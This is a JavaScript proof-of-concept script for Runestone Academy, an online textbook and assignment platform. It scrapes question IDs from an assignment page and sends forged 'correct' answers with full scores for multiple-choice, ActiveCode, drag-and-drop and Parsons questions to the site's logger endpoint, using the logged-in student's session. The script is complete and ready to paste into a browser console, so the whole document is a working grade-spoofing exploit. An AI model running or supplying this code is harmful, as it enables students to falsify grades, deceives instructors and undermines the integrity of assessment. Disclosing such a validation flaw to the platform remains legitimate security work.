// Proof of Concept: Full Assignment Spoof for Runestone Academy
//
// This PoC demonstrates that nearly all self-graded activity types in Runestone Academy
// (Multiple Choice, ActiveCode, Drag and Drop) accept spoofed completion via the same
// `mChoice` event structure with no server-side validation.
//
// Parsons problems use a different structure but can also be spoofed.
//
// This script submits spoofed responses for all supported types to simulate
// 100% assignment completion.

(async () => {
    // Parse assignment ID from URL
    const urlParams = new URLSearchParams(window.location.search);
    const assignmentId = urlParams.get("assignment_id") || urlParams.get("_id");

    if (!assignmentId) {
        alert("Assignment ID not found.");
        return;
    }

    const courseName = eBookConfig.course;

    // === [1] Spoof all questions that use the "mChoice" event ===
    const mcqDivs = document.getElementsByClassName("runestone_caption_divid");

    for (let i = 0; i < mcqDivs.length; i++) {
        const rawDiv = mcqDivs[i].innerHTML;
        const divId = rawDiv.substring(1, rawDiv.length - 1); // Remove brackets

        await fetch("https://runestone.academy/ns/logger/bookevent", {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": `https://runestone.academy/assignment/student/doAssignment?assignment_id=${assignmentId}`
            },
            credentials: "include",
            body: JSON.stringify({
                event: "mChoice",
                act: "answer:1:correct",
                answer: "1",
                correct: "T",
                div_id: divId,
                course_name: courseName,
                clientLoginStatus: true,
                timezoneoffset: 4,
                percent: 1,
                assignment_id: assignmentId
            })
        });

        console.log(`Spoofed mChoice-style question: ${divId}`);
    }

    // === [2] Spoof Parsons Problems ===
    const parsonsCaptions = document.getElementsByClassName("runestone_caption runestone_caption_text");

    for (let i = 0; i < parsonsCaptions.length; i++) {
        const rawText = parsonsCaptions[i].innerHTML;

        if (!rawText.includes("Parsons")) continue;

        const divId = rawText.match(/\((.*?)\)/)?.[1];
        if (!divId) {
            console.warn(`Failed to extract Parsons div_id from caption: ${rawText}`);
            continue;
        }

        await fetch("https://runestone.academy/ns/logger/bookevent", {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": `https://runestone.academy/assignment/student/doAssignment?assignment_id=${assignmentId}`
            },
            credentials: "include",
            body: JSON.stringify({
                event: "parsons",
                div_id: divId,
                answer: "0_1_0-5_0",
                source: "2_0-3_0-4_0",
                adaptive: "c2-s",
                correct: "T",
                act: "correct|2_0-3_0-4_0|0_1_0-5_0|c2-s",
                course_name: courseName,
                clientLoginStatus: true,
                timezoneoffset: 4,
                percent: 1,
                assignment_id: assignmentId
            })
        });

        console.log(`Spoofed Parsons problem: ${divId}`);
    }


    alert("All spoofed submissions sent. Refresh to view updated scores.");
})();
